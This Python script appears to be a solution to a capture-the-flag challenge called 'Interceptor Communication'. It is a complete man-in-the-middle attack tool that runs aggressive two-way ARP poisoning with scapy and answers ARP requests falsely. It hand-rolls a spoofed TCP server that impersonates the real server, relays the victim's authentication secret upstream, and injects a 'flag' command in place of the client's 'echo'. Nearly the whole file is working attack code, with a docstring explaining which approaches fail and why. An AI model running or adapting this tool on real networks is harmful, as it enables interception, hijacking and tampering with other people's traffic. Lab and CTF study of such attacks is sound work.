#!/usr/bin/env python3
"""
mitm.py — man-in-the-middle relay for the "Interceptor Communication" challenge.

=============================================================================
WHY THE SIMPLE APPROACHES DON'T WORK HERE   (kept as #WRONG / #WHY)
=============================================================================
The flag lives on the SERVER (10.0.0.3) and is sent ONLY when the server
receives the command b"flag" (run:68-70). The client NEVER sends "flag" — it
sends "echo" (run:28). The server answers only after a valid per-connection
secret, which the client reads out-of-band from the server's shared memory
(run:22) — the attacker cannot know it. So the attack MUST be a relay: forward
the auth handshake verbatim (the client computes a valid secret hex for us for
free), then rewrite the client's "echo" into "flag" and read the flag back.

    # WRONG: impersonate the server; data = recv(); print("FLAG", data)
    # WHY:   the client first sends the SECRET HEX, not the flag. Impersonation
    #        alone is a dead end — the flag is on the server.

    # WRONG: ARP-poison + iptables REDIRECT to a local listening socket.
    # WHY:   the challenge box has NO nf_nat module (verified: `lsmod` has no
    #        nf_nat/iptable_nat), so REDIRECT/DNAT is unavailable. And binding a
    #        normal socket never receives the client's SYN, because its dst IP
    #        (10.0.0.3) is not local to us -> the kernel silently drops it and
    #        accept() hangs forever (the "no client connected" symptom).

=============================================================================
WHAT WORKS ON A NO-NAT BOX: raw client-facing TCP + kernel upstream.
=============================================================================
  * Poison the client HARD: op=2 replies AND op=1 requests (a request rewrites
    the client's cached 10.0.0.3 entry even when gratuitous replies are
    ignored), plus answer who-has. Goal: the client sends 10.0.0.3 traffic to
    our MAC AND never reaches the real server directly (a single direct
    connection re-randomizes the server's secret and desyncs the relay).
  * CLIENT side: the kernel drops the client's SYN (10.0.0.3 is not our IP), so
    we sniff the frames and speak TCP by hand in scapy. We never assign
    10.0.0.3, so nothing loops back.
  * SERVER side: an ordinary kernel socket to the real 10.0.0.3 (reachable
    exactly because we did NOT alias it / poison ourselves).
  * Lock-step relay: secret: -> hex -> command: -> (swap echo->flag) -> FLAG.

Run as root inside the user_host (10.0.0.1) namespace:  python3 mitm.py
"""

import queue
import random
import socket
import sys
import threading
import time

from scapy.all import (ARP, Ether, IP, TCP, Raw, AsyncSniffer, conf,
                        get_if_addr, get_if_hwaddr, getmacbyip, sendp)

PORT = 31337
CLIENT = "10.0.0.2"
SERVER = "10.0.0.3"


def log(msg: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", file=sys.stderr, flush=True)


def pick_iface() -> str:
    for name in conf.ifaces:
        try:
            if str(get_if_addr(name)).startswith("10.0.0."):
                return name
        except Exception:
            continue
    return str(conf.iface)


IFACE = pick_iface()
OUR_MAC = get_if_hwaddr(IFACE)
BCAST = "ff:ff:ff:ff:ff:ff"
CLIENT_MAC = getmacbyip(CLIENT) or BCAST
SERVER_MAC = getmacbyip(SERVER) or BCAST    # real server's MAC (for server-side poison)

POISON_INTERVAL = 0.02   # ~50 Hz: win the ARP race at the client's connect() time


# ---------------------------------------------------------------------------
# ARP poisoning (aggressive, BOTH directions):
#   * tell the CLIENT that 10.0.0.3 (server) is at our MAC  -> its traffic comes to us
#   * tell the SERVER that 10.0.0.2 (client) is at our MAC  -> the real server can no
#     longer reinforce the client's cache, and any direct client SYN that slips
#     through gets its SYN-ACK black-holed (so the server never accepts it and never
#     re-randomizes the secret).
# We send op=1 requests (reliably rewrite an existing entry) AND op=2 replies.
# ---------------------------------------------------------------------------
def _poison_pair(victim_ip, victim_mac, spoof_ip):
    reply = Ether(dst=victim_mac, src=OUR_MAC) / ARP(
        op=2, psrc=spoof_ip, hwsrc=OUR_MAC, pdst=victim_ip, hwdst=victim_mac)
    request = Ether(dst=victim_mac, src=OUR_MAC) / ARP(
        op=1, psrc=spoof_ip, hwsrc=OUR_MAC, pdst=victim_ip, hwdst=victim_mac)
    return [reply, request]


def arp_poison(stop: threading.Event) -> None:
    pkts = (_poison_pair(CLIENT, CLIENT_MAC, SERVER)    # client: 10.0.0.3 -> us
            + _poison_pair(SERVER, SERVER_MAC, CLIENT))  # server: 10.0.0.2 -> us
    log(f"poisoning {CLIENT}(mac {CLIENT_MAC}) & {SERVER}(mac {SERVER_MAC}) "
        f"-> {OUR_MAC} via {IFACE} every {POISON_INTERVAL}s")
    while not stop.is_set():
        sendp(pkts, iface=IFACE, verbose=False)
        time.sleep(POISON_INTERVAL)


def arp_responder(stop: threading.Event) -> None:
    """Instantly answer who-has for either victim's spoofed target."""
    def reply_to(pkt):
        if stop.is_set() or not pkt.haslayer(ARP) or pkt[ARP].op != 1:
            return
        # client asking for server, or server asking for client -> we answer "it's us"
        if pkt[ARP].psrc == CLIENT and pkt[ARP].pdst == SERVER:
            spoof, victim = SERVER, CLIENT
        elif pkt[ARP].psrc == SERVER and pkt[ARP].pdst == CLIENT:
            spoof, victim = CLIENT, SERVER
        else:
            return
        ans = Ether(dst=pkt[Ether].src, src=OUR_MAC) / ARP(
            op=2, psrc=spoof, hwsrc=OUR_MAC, pdst=victim, hwdst=pkt[ARP].hwsrc)
        sendp(ans, iface=IFACE, verbose=False)
    AsyncSniffer(iface=IFACE, filter="arp", prn=reply_to, store=False).start()


# ---------------------------------------------------------------------------
# Minimal hand-rolled TCP server for the client-facing connection.
# ---------------------------------------------------------------------------
class ClientTCP:
    def __init__(self, syn, pkts: "queue.Queue"):
        self.pkts = pkts
        self.cmac = syn[Ether].src
        self.cport = syn[TCP].sport
        self.client_seq = syn[TCP].seq + 1
        self.our_seq = random.randrange(0, 2**32)
        self._send(flags="SA")
        self.our_seq += 1

    def _send(self, flags, payload=b""):
        pkt = (Ether(dst=self.cmac, src=OUR_MAC)
               / IP(src=SERVER, dst=CLIENT)
               / TCP(sport=PORT, dport=self.cport, flags=flags,
                     seq=self.our_seq, ack=self.client_seq, window=8192))
        if payload:
            pkt = pkt / Raw(load=payload)
        sendp(pkt, iface=IFACE, verbose=False)

    def _mine(self, pkt) -> bool:
        return (pkt.haslayer(TCP) and pkt[IP].src == CLIENT
                and pkt[TCP].sport == self.cport and pkt[TCP].dport == PORT)

    def wait_established(self, timeout=10) -> bool:
        end = time.time() + timeout
        while time.time() < end:
            try:
                pkt = self.pkts.get(timeout=end - time.time())
            except queue.Empty:
                return False
            if not self._mine(pkt):
                continue
            f = pkt[TCP].flags
            if f & 0x04:
                return False
            if f & 0x02:                     # SYN retransmit -> re-ack
                self.our_seq -= 1
                self.client_seq = pkt[TCP].seq + 1
                self._send(flags="SA")
                self.our_seq += 1
                continue
            if f & 0x10:
                return True
        return False

    def send_payload(self, data: bytes) -> None:
        self._send(flags="PA", payload=data)
        self.our_seq += len(data)

    def recv_payload(self, timeout=12) -> bytes:
        end = time.time() + timeout
        while time.time() < end:
            try:
                pkt = self.pkts.get(timeout=end - time.time())
            except queue.Empty:
                break
            if not self._mine(pkt):
                continue
            if pkt[TCP].flags & 0x04:
                raise ConnectionError("client reset")
            payload = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
            if not payload:
                continue
            if pkt[TCP].seq != self.client_seq:
                self._send(flags="A")
                continue
            self.client_seq += len(payload)
            self._send(flags="A")
            return payload
        raise TimeoutError("no client payload")

    def reset(self) -> None:
        self._send(flags="R")


# ---------------------------------------------------------------------------
# The relay / attack.
# ---------------------------------------------------------------------------
def run_session(conn: ClientTCP) -> bytes | None:
    upstream = socket.create_connection((SERVER, PORT), timeout=12)
    upstream.settimeout(12)
    log(f"[>] upstream connected to {SERVER}:{PORT}")
    try:
        prompt = upstream.recv(1024)                 # server->client: b"secret: "
        log(f"[relay] secret prompt = {prompt!r}")
        conn.send_payload(prompt)

        secret_hex = conn.recv_payload()             # client->server: secret hex
        log(f"[relay] client secret hex len={len(secret_hex)} head={secret_hex[:16]!r}")
        upstream.sendall(secret_hex)                 # verbatim -> authenticates us

        prompt = upstream.recv(1024)                 # server->client: b"command: "
        log(f"[relay] command prompt = {prompt!r}  (empty => secret rejected)")
        conn.send_payload(prompt)

        client_cmd = conn.recv_payload()             # client's real command (b"echo")
        log(f"[relay] client command = {client_cmd!r}")
        log("[attack] injecting b'flag' to server")
        upstream.sendall(b"flag")                    # <-- the attack: echo -> flag

        flag = upstream.recv(1024)                   # server replies with the flag
        log(f"[relay] flag response len={len(flag)} = {flag!r}")
        return flag if flag.strip() else None
    finally:
        upstream.close()


def main() -> None:
    conf.iface = IFACE
    log(f"[*] iface={IFACE} our_mac={OUR_MAC}")
    stop = threading.Event()
    arp_responder(stop)
    threading.Thread(target=arp_poison, args=(stop,), daemon=True).start()

    pkts: "queue.Queue" = queue.Queue()
    sniffer = AsyncSniffer(
        iface=IFACE,
        filter=f"tcp and src host {CLIENT} and dst host {SERVER} and dst port {PORT}",
        prn=pkts.put, store=False)
    sniffer.start()
    log(f"[*] relay up; waiting to intercept {CLIENT} -> {SERVER}:{PORT}")

    try:
        while True:
            pkt = pkts.get()
            f = pkt[TCP].flags
            if not (f & 0x02) or (f & 0x10):     # want a pure SYN
                continue
            conn = ClientTCP(pkt, pkts)
            if not conn.wait_established():
                continue
            log("[+] client TCP established")
            try:
                flag = run_session(conn)
            except (OSError, ConnectionError, TimeoutError):
                try:
                    conn.reset()
                except Exception:
                    pass
                continue
            if flag:
                log(f"[+] FLAG: {flag.decode(errors='replace')}")
                print(flag.decode(errors="replace"))
                conn.reset()
                return
            conn.reset()
    finally:
        stop.set()
        sniffer.stop()


if __name__ == "__main__":
    main()
